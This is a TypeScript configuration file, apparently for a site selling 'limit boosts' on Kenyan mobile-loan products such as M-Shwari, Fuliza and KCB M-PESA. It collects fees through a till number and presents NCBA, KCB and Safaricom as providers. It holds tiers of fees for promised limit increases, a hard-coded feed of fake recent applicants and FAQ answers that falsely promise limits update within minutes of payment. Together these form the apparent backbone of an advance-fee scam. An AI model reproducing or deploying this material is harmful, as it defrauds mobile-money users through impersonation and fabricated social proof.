import { ProgramConfig, RecentTransaction } from '../types';

export const TILL_NUMBER = '3122179';
export const TILL_NAME = 'LOAN REVIEW SERVICES';

export const PROGRAMS: Record<string, ProgramConfig> = {
  mshwari: {
    id: 'mshwari',
    name: 'M-Shwari',
    heroWords: ['M-Shwari', 'Loan Boost'],
    subtitle: 'Apply for an official M-Shwari limit review & credit boost',
    cardTitle: 'Select Your M-Shwari Limit',
    description: 'NCBA & Safaricom micro-credit savings and mobile loan limit enhancement review',
    provider: 'NCBA Bank Kenya PLC & Safaricom PLC',
    limits: [
      { amount: 10000, fee: 100 },
      { amount: 12500, fee: 130 },
      { amount: 16000, fee: 180 },
      { amount: 21000, fee: 200 },
      { amount: 25500, fee: 220 },
      { amount: 30000, fee: 350, badge: 'Most Popular', badgeClass: 'popular' },
      { amount: 35000, fee: 420 },
      { amount: 40000, fee: 540 },
      { amount: 45000, fee: 680 },
      { amount: 50000, fee: 500, originalFee: 960, badge: 'Hot Deal', badgeClass: 'max' },
      { amount: 60000, fee: 1550, badge: 'Premium', badgeClass: 'premium' },
      { amount: 70000, fee: 2000, badge: 'Max Limit', badgeClass: 'max' },
    ],
  },
  fuliza: {
    id: 'fuliza',
    name: 'Pochi Fuliza',
    heroWords: ['Pochi', 'Fuliza Boost'],
    subtitle: 'Apply for a Pochi la Biashara merchant float & Fuliza limit review',
    cardTitle: 'Select Your Pochi Fuliza Limit',
    description: 'Empower your daily enterprise transactions with upgraded overdraft capital',
    provider: 'Safaricom Pochi la Biashara & Fuliza Overdraft',
    limits: [
      { amount: 10000, fee: 100 },
      { amount: 12500, fee: 130, badge: 'Most Popular', badgeClass: 'popular' },
      { amount: 16000, fee: 180 },
      { amount: 21000, fee: 200 },
      { amount: 25500, fee: 220 },
      { amount: 30000, fee: 350 },
      { amount: 35000, fee: 420 },
      { amount: 40000, fee: 540 },
      { amount: 45000, fee: 680 },
      { amount: 50000, fee: 500, originalFee: 960, badge: 'Hot Deal', badgeClass: 'max' },
      { amount: 60000, fee: 1550, badge: 'Premium', badgeClass: 'premium' },
      { amount: 70000, fee: 2000, badge: 'Max Limit', badgeClass: 'max' },
    ],
  },
  fuliza_personal: {
    id: 'fuliza_personal',
    name: 'Fuliza M-PESA',
    heroWords: ['Fuliza', 'Overdraft Boost'],
    subtitle: 'Increase your personal Safaricom M-PESA continuous overdraft ceiling',
    cardTitle: 'Select Your Fuliza Limit',
    description: 'Complete any transaction instantly even when your M-Pesa balance is zero',
    provider: 'KCB, NCBA & Safaricom Fuliza Service',
    limits: [
      { amount: 10000, fee: 100 },
      { amount: 15000, fee: 150 },
      { amount: 20000, fee: 200 },
      { amount: 30000, fee: 350, badge: 'High Demand', badgeClass: 'popular' },
      { amount: 45000, fee: 600 },
      { amount: 50000, fee: 500, originalFee: 900, badge: 'Special Offer', badgeClass: 'max' },
      { amount: 65000, fee: 1650 },
      { amount: 80000, fee: 2200, badge: 'VIP Cap', badgeClass: 'premium' },
    ],
  },
  kcb_mpesa: {
    id: 'kcb_mpesa',
    name: 'KCB M-PESA',
    heroWords: ['KCB', 'M-PESA Boost'],
    subtitle: 'Fast-track your KCB M-PESA 30-day mobile loan limit assessment',
    cardTitle: 'Select Your KCB M-PESA Limit',
    description: 'Higher borrowing limits with flexible monthly repayment tenures',
    provider: 'KCB Bank Kenya Ltd & Safaricom PLC',
    limits: [
      { amount: 10000, fee: 100 },
      { amount: 15000, fee: 160 },
      { amount: 25000, fee: 250 },
      { amount: 35000, fee: 400, badge: 'Recommended', badgeClass: 'popular' },
      { amount: 50000, fee: 500, originalFee: 950, badge: 'Top Value', badgeClass: 'max' },
      { amount: 75000, fee: 1800, badge: 'Max Limit', badgeClass: 'max' },
    ],
  },
};

export const INITIAL_RECENT_FEEDS: RecentTransaction[] = [
  { id: '1', phoneMasked: '0718****36', program: 'M-Shwari', amount: 10000, timeAgo: 'just now' },
  { id: '2', phoneMasked: '0724****81', program: 'Pochi Fuliza', amount: 30000, timeAgo: '1 min ago' },
  { id: '3', phoneMasked: '0791****42', program: 'M-Shwari', amount: 50000, timeAgo: '2 mins ago' },
  { id: '4', phoneMasked: '0705****63', program: 'Pochi Fuliza', amount: 20000, timeAgo: '3 mins ago' },
  { id: '5', phoneMasked: '0112****57', program: 'Fuliza M-PESA', amount: 12500, timeAgo: '4 mins ago' },
  { id: '6', phoneMasked: '0743****29', program: 'M-Shwari', amount: 25500, timeAgo: '5 mins ago' },
  { id: '7', phoneMasked: '0722****90', program: 'KCB M-PESA', amount: 35000, timeAgo: '7 mins ago' },
  { id: '8', phoneMasked: '0758****14', program: 'M-Shwari', amount: 40000, timeAgo: '9 mins ago' },
];

export const FAQS = [
  {
    q: 'What is the Loan Boost limit review process?',
    a: 'Loan Boost facilitates an accelerated credit rating review with Kenya’s mobile financial network algorithms (NCBA Bank, KCB, and Safaricom). By submitting an official application and settling the one-time network processing fee, your customer profile is queued for an updated credit appraisal.',
  },
  {
    q: 'How quickly does the new limit reflect on my phone?',
    a: 'Once your payment is verified server-side through UpesiPay and Safaricom, your application file is submitted to the lending switchboard. Most users see their limit update within 2 to 15 minutes. You can verify by dialing *334# or opening the M-PESA / mySafaricom App.',
  },
  {
    q: 'What if the M-PESA STK push does not prompt on my phone?',
    a: 'Network traffic, battery saver mode, or Do-Not-Disturb settings can occasionally delay automated STK popups. Ensure your phone screen is unlocked with active cellular reception, and click "Retry M-Pesa STK Push" to re-trigger the prompt.',
  },
  {
    q: 'Is my national ID and phone number kept secure?',
    a: 'Yes. All data transmissions are encrypted using 256-bit SSL encryption strictly compliant with the Kenya Data Protection Act, 2019. We do not store PINs or banking credentials.',
  },
  {
    q: 'Can I apply for multiple limits (e.g., both M-Shwari and Fuliza)?',
    a: 'Yes. You can switch tabs between M-Shwari, Pochi Fuliza, and Fuliza ya M-PESA to submit separate reviews for each distinct credit facility.',
  },
];
